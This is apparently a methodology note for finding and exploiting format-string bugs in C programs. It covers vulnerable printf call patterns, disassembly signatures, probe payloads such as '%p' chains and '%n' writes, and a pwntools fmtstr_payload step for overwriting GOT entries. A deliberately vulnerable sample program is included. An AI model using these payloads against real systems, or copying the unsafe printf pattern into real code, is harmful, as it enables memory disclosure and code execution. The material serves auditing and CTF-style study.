# Format string

## (a) Source pattern

Attacker bytes used as the *format* argument of a printf-family function:

```c
printf(user);                    // BUG
fprintf(stderr, user);           // BUG
snprintf(buf, n, user);          // BUG (still %n-capable)
syslog(LOG_INFO, user);          // BUG (classic)
printf("%s", user);              // SAFE
```

Any `v*printf` wrapper counts: custom `log_msg(fmt, ...)` functions that
forward to `vsnprintf` are the common real-world shape — the bug is at the
*caller* that passes user data as `fmt`.

## (b) Binary / disassembly signature

Safe call site — format is a literal:

```
lea    rdi, [rip+0xe52]        ; "Result: %s\n" in .rodata
mov    rsi, rbx
xor    eax, eax
call   printf@plt
```

Vulnerable call site — format is data:

```
mov    rdi, rbx                ; rbx = heap/stack buffer with user bytes
xor    eax, eax                ; variadic: 0 SSE args
call   printf@plt              ; only ONE argument materialized
```

Markers:

- 1st arg (`rdi`; 2nd/`rsi` for fprintf/snprintf-family, 2nd for syslog)
  is **not** a `lea reg, [rip+const]` into .rodata — it's a register/stack
  value traced from input.
- Often only the format arg is set up (no rsi/rdx/... loads) — a printf
  with "no arguments" and a non-literal format is almost always the bug.
- Sweep: `objdump -d -M intel target | grep -B6 'printf@plt'` and eyeball
  each `rdi` setup; r2: `axt @ sym.imp.printf`, inspect each site with
  `pd-- 8 @ hit`. Ghidra decompiler shows `printf(local_buf)` directly.
- In source: compile with `-Wformat-security` — it flags exactly this.

## (c) Dynamic confirmation

Send probes through the input path:

```
%p.%p.%p.%p.%p.%p        -> "0x7ffd...0x1f.0x7f3a..." = CONFIRMED (stack leak)
AAAABBBB%7$p             -> walk the index until 0x4242424241414141 appears
                            = your buffer is at positional offset N (here 7)
%s at a chosen index     -> read through a pointer (arbitrary read once you
                            can place an address in the buffer: AAAA<addr>%7$s)
```

x86-64: positions 1–5 are registers (rsi,rdx,rcx,r8,r9), 6+ is the stack.
In gdb, break at the `call printf@plt`, `x/8gx $rsp` to see what `%6$p`
onward will leak (canary, libc return addresses, PIE pointers — map them).
`%n` test (careful: it writes): `%7$n` with your buffer holding a writable
address → the word there becomes the count of printed chars.

## (d) Primitive and hand-off

- **Arbitrary read**: `<addr>%k$s` — dump GOT entries → libc base → defeat
  ASLR for every other bug in the binary. Leak `%k$p` of the canary slot →
  defeat the stack canary for a class-1 overflow.
- **Arbitrary write**: `%n` (4 bytes), `%hn` (2), `%hhn` (1) with padding
  (`%123c`) to set the count — byte-by-byte write-what-where. Classic
  targets: GOT entry (partial RELRO), `exit` handlers, return address on
  the stack (leak RSP first with `%p`).
- Load `format-string-exploitation`; pwntools automates the whole thing:
  `fmtstr_payload(offset, {target_addr: value})` — hand it the positional
  offset found above. Delivery via `pwntools`.
- FORTIFY (`__printf_chk`): `%n` from writable memory and positional+gap
  usage blocked — reads often still work; check which call sites are
  `_chk` and which are not.

## Worked micro-example

```c
// gcc -no-pie -o fmt fmt.c
#include <stdio.h>
int main(void) {
    char buf[128];
    fgets(buf, sizeof buf, stdin);
    printf(buf);                      // vulnerable
}
```

```
$ echo '%p.%p.%p.%p.%p.%p' | ./fmt
0x7ffe....0x0.0x7f6c....(nil).0x7f6c....0x70252e7025252e70   <- pos 6 = our buffer
$ echo 'AAAAAAAA%6$p' | ./fmt
AAAAAAAA0x4141414141414141                                   <- offset = 6
```

Offset 6 + a GOT address → `fmtstr_payload(6, {elf.got.exit: elf.sym.win})`.
